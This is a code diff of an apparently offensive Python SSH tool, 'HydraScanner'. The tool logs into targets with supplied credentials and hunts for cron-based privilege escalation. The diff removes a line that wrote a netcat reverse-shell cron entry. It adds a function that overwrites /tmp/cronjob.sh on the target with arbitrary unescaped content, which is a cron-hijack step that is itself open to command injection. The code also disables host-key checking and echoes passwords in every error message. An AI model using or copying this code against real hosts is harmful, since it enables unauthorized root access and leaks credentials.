@@ -25,75 +25,267 @@ class HydraScanner:
     async def _check_cron_privilege_escalation(self, ssh_client: paramiko.SSHClient) -> str:
         """cronジョブの権限昇格の可能性をチェックします。"""
         results = []
-        results.append("🔍 CRON PRIVILEGE ESCALATION ANALYSIS")
-        results.append("=" * 50)
+        results.append("🔍 CRON ANALYSIS SUMMARY")
+        results.append("=" * 30)
         
-        # 1. /etc/crontabの確認
-        results.append("\n📋 1. Checking /etc/crontab:")
-        crontab_content = await self._execute_ssh_command(ssh_client, "cat /etc/crontab")
-        results.append(f"Content:\n{crontab_content}")
-        
-        # 2. ユーザーのcronジョブ確認
-        results.append("\n📋 2. Checking user cron jobs:")
-        user_cron = await self._execute_ssh_command(ssh_client, "crontab -l 2>/dev/null || echo 'No user cron jobs'")
-        results.append(f"User cron jobs:\n{user_cron}")
-        
-        # 3. システム全体のcronジョブ確認
-        results.append("\n📋 3. Checking system cron directories:")
-        cron_dirs = ["/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly", "/etc/cron.monthly", "/etc/cron.weekly"]
-        for cron_dir in cron_dirs:
-            dir_content = await self._execute_ssh_command(ssh_client, f"ls -la {cron_dir} 2>/dev/null || echo 'Directory not found'")
-            results.append(f"\n{cron_dir}:\n{dir_content}")
-        
-        # 4. 実行可能なcronジョブの検索
-        results.append("\n📋 4. Searching for writable cron jobs:")
-        writable_cron = await self._execute_ssh_command(ssh_client, "find /etc/cron* -type f -writable 2>/dev/null || echo 'No writable cron files found'")
-        results.append(f"Writable cron files:\n{writable_cron}")
-        
-        # 5. 権限昇格の可能性を分析
-        results.append("\n📋 5. Privilege escalation analysis:")
-        
-        # 現在のユーザーとグループを確認
+        # 重要な情報のみを収集
         current_user = await self._execute_ssh_command(ssh_client, "whoami")
-        current_groups = await self._execute_ssh_command(ssh_client, "groups")
-        results.append(f"Current user: {current_user}")
-        results.append(f"Current groups: {current_groups}")
+        writable_cron = await self._execute_ssh_command(ssh_client, "find /etc/cron* -type f -writable 2>/dev/null || echo 'No writable cron files found'")
         
-        # sudo権限の確認
-        sudo_check = await self._execute_ssh_command(ssh_client, "sudo -l 2>/dev/null || echo 'No sudo access'")
-        results.append(f"Sudo privileges:\n{sudo_check}")
+        # カスタムcronジョブの確認
+        custom_cron = await self._execute_ssh_command(ssh_client, "grep -v '^#' /etc/crontab | grep -v '^$' | grep -v 'run-parts' || echo 'No custom cron jobs'")
         
-        # 6. 権限昇格の試行
-        results.append("\n📋 6. Attempting privilege escalation:")
+        # 重要なcronファイルの確認
+        important_cron_files = await self._execute_ssh_command(ssh_client, "ls -la /etc/cron.d/ 2>/dev/null | grep -v '^d' | grep -v 'total' || echo 'No cron.d files'")
         
-        # 方法1: 既存のcronジョブに悪意のあるコマンドを追加
+        # /tmp/cronjob.shファイルの確認
+        tmp_cronjob = await self._execute_ssh_command(ssh_client, "ls -la /tmp/cronjob.sh 2>/dev/null || echo 'No /tmp/cronjob.sh found'")
+        
+        results.append(f"👤 Current User: {current_user}")
+        
+        # カスタムcronジョブがある場合のみ表示
+        if "No custom cron jobs" not in custom_cron:
+            results.append(f"📅 Custom Cron Jobs:\n{custom_cron}")
+        
+        # 書き込み可能なcronファイルがある場合のみ表示
         if "No writable cron files found" not in writable_cron:
-            results.append("⚠️ Found writable cron files - potential for privilege escalation!")
-            
-            # 例: リバースシェルの作成を試行
-            reverse_shell_attempt = await self._execute_ssh_command(
-                ssh_client, 
-                "echo '*/1 * * * * nc -e /bin/bash 127.0.0.1 4444' >> /tmp/test_cron 2>/dev/null && echo 'Test cron entry created' || echo 'Failed to create test cron entry'"
-            )
-            results.append(f"Reverse shell attempt: {reverse_shell_attempt}")
+            results.append(f"⚠️ Writable Cron Files:\n{writable_cron}")
         
-        # 方法2: PATH環境変数の悪用
-        path_check = await self._execute_ssh_command(ssh_client, "echo $PATH")
-        results.append(f"Current PATH: {path_check}")
+        # 重要なcronファイルがある場合のみ表示
+        if "No cron.d files" not in important_cron_files:
+            results.append(f"📁 Important Cron Files:\n{important_cron_files}")
         
-        # 方法3: 既存のスクリプトの上書き
-        script_check = await self._execute_ssh_command(ssh_client, "find /etc/cron* -name '*.sh' -exec ls -la {} \\; 2>/dev/null || echo 'No cron scripts found'")
-        results.append(f"Cron scripts:\n{script_check}")
+        # /tmp/cronjob.shファイルがある場合のみ表示
+        if "No /tmp/cronjob.sh found" not in tmp_cronjob:
+            results.append(f"📄 /tmp/cronjob.sh:\n{tmp_cronjob}")
+            # ファイルの内容も確認
+            cronjob_content = await self._execute_ssh_command(ssh_client, "cat /tmp/cronjob.sh 2>/dev/null || echo 'Cannot read file'")
+            results.append(f"📝 Content:\n{cronjob_content}")
         
-        # 7. 推奨対策
-        results.append("\n📋 7. Security recommendations:")
-        results.append("• Ensure cron files have proper permissions (644 or 600)")
-        results.append("• Regularly audit cron jobs for suspicious entries")
-        results.append("• Use absolute paths in cron jobs")
-        results.append("• Implement file integrity monitoring")
-        results.append("• Restrict cron access to authorized users only")
+        # 権限昇格の可能性を簡潔に評価
+        if "No writable cron files found" not in writable_cron:
+            results.append("\n🚨 PRIVILEGE ESCALATION POSSIBLE!")
+            results.append("• Found writable cron files")
+            results.append("• Can potentially modify cron jobs")
+        else:
+            results.append("\n✅ No obvious privilege escalation vectors found")
         
         return "\n".join(results)
+
+    async def ssh_edit_cronjob(self, target: str, username: str, password: str, new_content: str, port: int = 22) -> str:
+        """SSH接続後に/tmp/cronjob.shファイルを直接編集します。"""
+        
+        try:
+            # SSHクライアントを作成
+            ssh_client = paramiko.SSHClient()
+            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            
+            # 接続タイムアウトを設定
+            ssh_client.connect(
+                hostname=target,
+                port=port,
+                username=username,
+                password=password,
+                timeout=self.timeout,
+                banner_timeout=self.timeout,
+                auth_timeout=self.timeout
+            )
+            
+            try:
+                # 現在のファイル内容を確認
+                current_content = await self._execute_ssh_command(ssh_client, "cat /tmp/cronjob.sh 2>/dev/null || echo 'File does not exist'")
+                
+                if "File does not exist" in current_content:
+                    # ファイルが存在しない場合は新規作成
+                    create_result = await self._execute_ssh_command(ssh_client, f"echo '{new_content}' > /tmp/cronjob.sh")
+                    chmod_result = await self._execute_ssh_command(ssh_client, "chmod +x /tmp/cronjob.sh")
+                    
+                    # 作成結果を確認
+                    final_content = await self._execute_ssh_command(ssh_client, "cat /tmp/cronjob.sh")
+                    file_info = await self._execute_ssh_command(ssh_client, "ls -la /tmp/cronjob.sh")
+                    
+                    ssh_client.close()
+                    
+                    return f"""✅ SUCCESS: /tmp/cronjob.sh created and edited!
+
+📄 File Information:
+{file_info}
+
+📝 New Content:
+{final_content}
+
+💡 The file has been created with executable permissions."""
+                    
+                else:
+                    # ファイルが存在する場合は上書き
+                    backup_result = await self._execute_ssh_command(ssh_client, "cp /tmp/cronjob.sh /tmp/cronjob.sh.backup")
+                    edit_result = await self._execute_ssh_command(ssh_client, f"echo '{new_content}' > /tmp/cronjob.sh")
+                    
+                    # 編集結果を確認
+                    final_content = await self._execute_ssh_command(ssh_client, "cat /tmp/cronjob.sh")
+                    file_info = await self._execute_ssh_command(ssh_client, "ls -la /tmp/cronjob.sh")
+                    
+                    ssh_client.close()
+                    
+                    return f"""✅ SUCCESS: /tmp/cronjob.sh edited!
+
+📄 File Information:
+{file_info}
+
+📝 New Content:
+{final_content}
+
+💾 Backup created: /tmp/cronjob.sh.backup
+
+💡 The file has been successfully updated."""
+                    
+            except Exception as e:
+                ssh_client.close()
+                return f"""❌ FAILED: Error editing /tmp/cronjob.sh
+
+🔧 Error: {str(e)}
+
+💡 Please check file permissions and try again."""
+                
+        except paramiko.AuthenticationException:
+            return f"""❌ FAILED: Authentication failed
+
+🔐 Login Attempt:
+  - Host: {target}:{port}
+  - Username: {username}
+  - Password: {password}
+
+💡 The username or password is incorrect."""
+            
+        except paramiko.SSHException as e:
+            return f"""❌ FAILED: SSH connection error
+
+🔐 Login Attempt:
+  - Host: {target}:{port}
+  - Username: {username}
+  - Password: {password}
+
+🔧 Error: {str(e)}"""
+            
+        except socket.timeout:
+            return f"""❌ FAILED: Connection timeout
+
+🔐 Login Attempt:
+  - Host: {target}:{port}
+  - Username: {username}
+  - Password: {password}
+
+⏱️ The connection timed out after {self.timeout} seconds."""
+            
+        except socket.gaierror:
+            return f"""❌ FAILED: Host not found
+
+🔐 Login Attempt:
+  - Host: {target}:{port}
+  - Username: {username}
+  - Password: {password}
+
+🌐 The host '{target}' could not be resolved."""
+            
+        except Exception as e:
+            return f"""❌ FAILED: Unexpected error
+
+🔐 Login Attempt:
+  - Host: {target}:{port}
+  - Username: {username}
+  - Password: {password}
+
+🚨 Error: {str(e)}"""
+
+    async def ssh_view_cronjob(self, target: str, username: str, password: str, port: int = 22) -> str:
+        """SSH接続後に/tmp/cronjob.shファイルの内容を表示します。"""
+        
+        try:
+            # SSHクライアントを作成
+            ssh_client = paramiko.SSHClient()
+            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            
+            # 接続タイムアウトを設定
+            ssh_client.connect(
+                hostname=target,
+                port=port,
+                username=username,
+                password=password,
+                timeout=self.timeout,
+                banner_timeout=self.timeout,
+                auth_timeout=self.timeout
+            )
+            
+            # ファイルの存在確認
+            file_exists = await self._execute_ssh_command(ssh_client, "test -f /tmp/cronjob.sh && echo 'exists' || echo 'not found'")
+            
+            if "exists" in file_exists:
+                # ファイル情報と内容を取得
+                file_info = await self._execute_ssh_command(ssh_client, "ls -la /tmp/cronjob.sh")
+                file_content = await self._execute_ssh_command(ssh_client, "cat /tmp/cronjob.sh")
+                
+                ssh_client.close()
+                
+                return f"""📄 /tmp/cronjob.sh File Information:
+
+{file_info}
+
+📝 File Content:
+{file_content}"""
+                
+            else:
+                ssh_client.close()
+                return "❌ File not found: /tmp/cronjob.sh does not exist."
+                
+        except paramiko.AuthenticationException:
+            return f"""❌ FAILED: Authentication failed
+
+🔐 Login Attempt:
+  - Host: {target}:{port}
+  - Username: {username}
+  - Password: {password}
+
+💡 The username or password is incorrect."""
+            
+        except paramiko.SSHException as e:
+            return f"""❌ FAILED: SSH connection error
+
+🔐 Login Attempt:
+  - Host: {target}:{port}
+  - Username: {username}
+  - Password: {password}
+
+🔧 Error: {str(e)}"""
+            
+        except socket.timeout:
+            return f"""❌ FAILED: Connection timeout
+
+🔐 Login Attempt:
+  - Host: {target}:{port}
+  - Username: {username}
+  - Password: {password}
+
+⏱️ The connection timed out after {self.timeout} seconds."""
+            
+        except socket.gaierror:
+            return f"""❌ FAILED: Host not found
+
+🔐 Login Attempt:
+  - Host: {target}:{port}
+  - Username: {username}
+  - Password: {password}
+
+🌐 The host '{target}' could not be resolved."""
+            
+        except Exception as e:
+            return f"""❌ FAILED: Unexpected error
+
+🔐 Login Attempt:
+  - Host: {target}:{port}
+  - Username: {username}
+  - Password: {password}
+
+🚨 Error: {str(e)}"""
 
     async def ssh_login_test(self, target: str, username: str, password: str, port: int = 22) -> str:
         """指定のIDとPasswordを使用してSSHログインを試します。"""
@@ -140,12 +332,9 @@ class HydraScanner:
 
 💡 The credentials are valid and you can now execute commands on the target system."""
                 
-                # cron権限昇格の分析を実行
-                cron_analysis = await self._check_cron_privilege_escalation(ssh_client)
-                
                 ssh_client.close()
                 
-                return f"{basic_info}\n\n{cron_analysis}"
+                return basic_info
                 
             except Exception as e:
                 ssh_client.close()
@@ -158,6 +347,82 @@ class HydraScanner:
 
 ⚠️ Note: Login successful but could not retrieve system information.
 Error: {str(e)}"""
+                
+        except paramiko.AuthenticationException:
+            return f"""❌ FAILED: Authentication failed
+
+🔐 Login Attempt:
+  - Host: {target}:{port}
+  - Username: {username}
+  - Password: {password}
+
+💡 The username or password is incorrect."""
+            
+        except paramiko.SSHException as e:
+            return f"""❌ FAILED: SSH connection error
+
+🔐 Login Attempt:
+  - Host: {target}:{port}
+  - Username: {username}
+  - Password: {password}
+
+🔧 Error: {str(e)}"""
+            
+        except socket.timeout:
+            return f"""❌ FAILED: Connection timeout
+
+🔐 Login Attempt:
+  - Host: {target}:{port}
+  - Username: {username}
+  - Password: {password}
+
+⏱️ The connection timed out after {self.timeout} seconds."""
+            
+        except socket.gaierror:
+            return f"""❌ FAILED: Host not found
+
+🔐 Login Attempt:
+  - Host: {target}:{port}
+  - Username: {username}
+  - Password: {password}
+
+🌐 The host '{target}' could not be resolved."""
+            
+        except Exception as e:
+            return f"""❌ FAILED: Unexpected error
+
+🔐 Login Attempt:
+  - Host: {target}:{port}
+  - Username: {username}
+  - Password: {password}
+
+🚨 Error: {str(e)}"""
+
+    async def ssh_cron_investigation(self, target: str, username: str, password: str, port: int = 22) -> str:
+        """SSH接続後にcronジョブの詳細調査を実行します。"""
+        
+        try:
+            # SSHクライアントを作成
+            ssh_client = paramiko.SSHClient()
+            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            
+            # 接続タイムアウトを設定
+            ssh_client.connect(
+                hostname=target,
+                port=port,
+                username=username,
+                password=password,
+                timeout=self.timeout,
+                banner_timeout=self.timeout,
+                auth_timeout=self.timeout
+            )
+            
+            # cron権限昇格の分析を実行
+            cron_analysis = await self._check_cron_privilege_escalation(ssh_client)
+            
+            ssh_client.close()
+            
+            return cron_analysis
                 
         except paramiko.AuthenticationException:
             return f"""❌ FAILED: Authentication failed
